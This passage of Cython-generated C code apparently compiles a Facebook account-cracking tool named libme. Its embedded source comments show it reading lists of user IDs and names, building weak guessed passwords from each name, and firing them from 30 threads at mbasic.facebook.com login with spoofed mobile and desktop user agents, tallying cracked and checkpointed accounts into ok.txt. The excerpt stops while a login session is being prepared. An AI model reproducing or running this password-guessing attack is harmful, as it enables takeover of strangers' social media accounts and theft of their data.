            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 785, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":784
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":763
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__mennn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pastefile);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":799
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __file__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_51__file__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_51__file__ = {"__file__", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_5libme_5James_51__file__, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5libme_5James_51__file__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_uid = 0;
  PyObject *__pyx_v_pwx = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__file__ (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_uid,&__pyx_n_s_pwx,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_uid)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__file__", 1, 3, 3, 1); __PYX_ERR(0, 799, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__file__", 1, 3, 3, 2); __PYX_ERR(0, 799, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "__file__") < 0)) __PYX_ERR(0, 799, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_uid = values[1];
    __pyx_v_pwx = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("__file__", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 799, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("libme.James.__file__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5libme_5James_50__file__(__pyx_self, __pyx_v_self, __pyx_v_uid, __pyx_v_pwx);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_50__file__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_kwargs = NULL;
  PyObject *__pyx_v_ses = NULL;
  PyObject *__pyx_v_p = NULL;
  PyObject *__pyx_v_b = NULL;
  PyObject *__pyx_v_bl = NULL;
  PyObject *__pyx_v_i = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_gaaa = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_kuki = NULL;
  PyObject *__pyx_v_key = NULL;
  PyObject *__pyx_v_value = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_t_17;
  int __pyx_t_18;
  PyObject *(*__pyx_t_19)(PyObject *);
  int __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__file__", 0);

  /* "libme.pyx":800
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __file__(self, uid, pwx):
 * 		ua = random.choice([             # <<<<<<<<<<<<<<
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 * 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 800, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 800, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 800, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_GIVEREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 800, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":812
 * 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 * 		])
 * 		host = 'https://mbasic.facebook.com'             # <<<<<<<<<<<<<<
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 */
  __Pyx_INCREF(__pyx_kp_s_https_mbasic_facebook_com);
  __pyx_v_host = __pyx_kp_s_https_mbasic_facebook_com;

  /* "libme.pyx":813
 * 		])
 * 		host = 'https://mbasic.facebook.com'
 * 		sys.stdout.write(             # <<<<<<<<<<<<<<
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 813, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 813, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 813, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":814
 * 		host = 'https://mbasic.facebook.com'
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))             # <<<<<<<<<<<<<<
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 */
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_5 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyTuple_New(4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_2 = 0;
  __pyx_t_4 = 0;
  __pyx_t_6 = 0;
  __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_ok_s_cp_s, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 814, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 813, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":815
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()             # <<<<<<<<<<<<<<
 * 		for pw in pwx:
 * 			kwargs = {}
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 815, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 815, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 815, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 815, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":816
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			kwargs = {}
 * 			pw = pw.lower()
 */
  if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
    __pyx_t_1 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_1); __pyx_t_5 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 816, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 816, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 816, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 816, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 816, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 816, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 816, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":817
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 * 			kwargs = {}             # <<<<<<<<<<<<<<
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 */
    __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 817, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_XDECREF_SET(__pyx_v_kwargs, ((PyObject*)__pyx_t_3));
    __pyx_t_3 = 0;

    /* "libme.pyx":818
 * 		for pw in pwx:
 * 			kwargs = {}
 * 			pw = pw.lower()             # <<<<<<<<<<<<<<
 * 			ses = requests.Session()
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 818, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 818, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":819
 * 			kwargs = {}
 * 			pw = pw.lower()
 * 			ses = requests.Session()             # <<<<<<<<<<<<<<
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 819, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_Session); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 819, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
